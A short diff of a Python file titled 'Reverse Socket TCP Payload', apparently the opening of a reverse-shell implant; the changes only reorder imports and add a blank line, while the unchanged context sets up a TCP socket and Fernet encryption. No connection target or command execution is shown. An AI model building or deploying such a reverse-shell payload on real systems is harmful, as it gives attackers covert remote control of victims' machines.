@@ -1,14 +1,14 @@
 # Reverse Socket TCP Payload
 # Author: @screamz2k
 
+import importlib
+import json
 import os
 import platform
-import time
-import json
-import ssl
-import importlib
-import subprocess as sp
 import socket
+import ssl
+import subprocess as sp
+import time
 
 # list of the modules you have to install manually
 imports = ["cryptography"]
@@ -27,6 +27,7 @@ except:
         exit(1)
 # Manually
 from cryptography.fernet import Fernet
+
 fernet = ""
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
